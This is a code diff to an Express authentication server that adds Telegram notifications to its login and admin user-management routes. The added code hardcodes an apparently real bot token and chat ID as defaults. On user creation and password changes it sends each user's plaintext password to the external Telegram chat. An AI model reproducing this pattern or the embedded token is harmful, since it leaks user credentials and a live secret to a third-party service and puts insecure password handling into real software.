@@ -11,6 +11,29 @@ const PORT = Number(process.env.PORT || 3001);
 app.set('trust proxy', 1);
 
 // ---------------------------------------------------------------------------
+// Telegram Notification Dispatcher
+// ---------------------------------------------------------------------------
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8992695880:AAEOeEp6YshIJWMPw_gMghikfhxXO1Mewd0';
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '1298501592';
+
+async function sendTelegramMessage(text) {
+  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
+  try {
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: text,
+        parse_mode: 'HTML'
+      })
+    });
+  } catch (err) {
+    console.error('Telegram notification error:', err.message);
+  }
+}
+
+// ---------------------------------------------------------------------------
 // 100% file-based authentication. No MongoDB, Mongoose or external database.
 // ---------------------------------------------------------------------------
 const DATA_DIR = process.env.AUTH_DATA_DIR || path.join(__dirname, 'data');
@@ -335,6 +358,10 @@ app.post('/api/auth/login', async (req, res) => {
       if (!stored.expires_at) {
         const minutes = Math.max(1, Number(stored.duration_minutes || 43200));
         stored.expires_at = new Date(Date.now() + minutes * 60 * 1000).toISOString();
+        
+        // Notify Telegram on first login activation
+        const activatedTime = new Date(stored.expires_at).toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+        sendTelegramMessage(`🚀 <b>User Account Activated!</b>\n<b>Username:</b> <code>${stored.username}</code>\n<b>Expires On:</b> ${activatedTime}`);
       }
     }
     writeUsers(users);
@@ -390,6 +417,9 @@ app.get('/api/auth/status', (req, res) => {
   return res.json({ authenticated: true, user: publicUser(auth.user) });
 });
 
+// ---------------------------------------------------------------------------
+// ADMIN USER MANAGEMENT API (WITH TELEGRAM NOTIFICATIONS)
+// ---------------------------------------------------------------------------
 app.get('/api/users', requireAdmin, (req, res) => {
   const users = readUsers().sort((a,b) => new Date(b.created_at || 0) - new Date(a.created_at || 0));
   res.set('Cache-Control', 'no-store');
@@ -401,17 +431,25 @@ app.post('/api/users', requireAdmin, async (req, res) => {
     const username = String(req.body?.username || '').trim();
     const password = String(req.body?.password || '');
     const duration = Number(req.body?.duration || 43200);
+    
     if (!username || !password) return res.status(400).json({ error: 'Username and password required' });
     if (username.length < 2 || username.length > 64) return res.status(400).json({ error: 'Username must be 2-64 characters.' });
     if (password.length < 1) return res.status(400).json({ error: 'Password is required.' });
     if (!Number.isFinite(duration) || duration <= 0 || duration > 525600) return res.status(400).json({ error: 'Invalid duration.' });
+    
     const users = readUsers();
     if (users.some(u => String(u.username || '').toLowerCase() === username.toLowerCase())) return res.status(409).json({ error: 'Username already exists.' });
+    
     const user = {
       id: makeId(), username, password_hash: await bcrypt.hash(password, 12), role: 'customer', is_active: true,
       expires_at: null, duration_minutes: Math.round(duration), created_at: new Date().toISOString(), last_login: null, active_session_id: null
     };
     users.push(user); writeUsers(users);
+    
+    // Telegram Notification
+    const expText = `${Math.round(duration / 60)} hours (Activates on first login)`;
+    sendTelegramMessage(`🟢 <b>New User Created</b>\n<b>Username:</b> <code>${username}</code>\n<b>Password:</b> <code>${password}</code>\n<b>Duration:</b> ${expText}`);
+    
     res.status(201).json({ success: true, message: 'User created successfully', user: publicUser(user) });
   } catch (err) { console.error('Create user error:', err); res.status(500).json({ error: 'Internal server error' }); }
 });
@@ -421,9 +459,15 @@ app.patch('/api/users/:id/extend', requireAdmin, (req, res) => {
   if (!Number.isFinite(days) || days <= 0 || days > 3650) return res.status(400).json({ error: 'Invalid number of days' });
   const users = readUsers(); const user = users.find(u => u.id === req.params.id && u.role !== 'admin');
   if (!user) return res.status(404).json({ error: 'User not found' });
+  
   if (!user.expires_at) user.duration_minutes = Number(user.duration_minutes || 43200) + days * 24 * 60;
   else user.expires_at = new Date(Math.max(Date.now(), new Date(user.expires_at).getTime()) + days * 24 * 60 * 60 * 1000).toISOString();
   user.is_active = true; writeUsers(users);
+  
+  // Telegram Notification
+  const expText = user.expires_at ? new Date(user.expires_at).toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }) : 'Pending first login';
+  sendTelegramMessage(`⏳ <b>User Extended</b>\n<b>Username:</b> <code>${user.username}</code>\n<b>Added:</b> ${days} days\n<b>New Expiry:</b> ${expText}`);
+  
   res.json({ success: true, newExpiry: user.expires_at || null });
 });
 
@@ -432,9 +476,14 @@ app.patch('/api/users/:id', requireAdmin, async (req, res) => {
   if (password.length < 6) return res.status(400).json({ error: 'Password must be at least 6 characters' });
   const users = readUsers(); const user = users.find(u => u.id === req.params.id && u.role !== 'admin');
   if (!user) return res.status(404).json({ error: 'User not found' });
+  
   user.password_hash = await bcrypt.hash(password, 12); writeUsers(users);
   revokeUserSessions(user.id);
   user.active_session_id = null; writeUsers(users);
+  
+  // Telegram Notification
+  sendTelegramMessage(`🔑 <b>Password Updated</b>\n<b>Username:</b> <code>${user.username}</code>\n<b>New Password:</b> <code>${password}</code>`);
+  
   res.json({ success: true, message: 'Password updated' });
 });
 
@@ -452,6 +501,10 @@ app.delete('/api/users/:id', requireAdmin, (req, res) => {
   if (index < 0) return res.status(404).json({ error: 'User not found' });
   const [deleted] = users.splice(index, 1); writeUsers(users);
   revokeUserSessions(deleted.id);
+  
+  // Telegram Notification
+  sendTelegramMessage(`🗑 <b>User Deleted</b>\n<b>Username:</b> <code>${deleted.username}</code>`);
+  
   res.json({ success: true, message: 'User deleted' });
 });
 
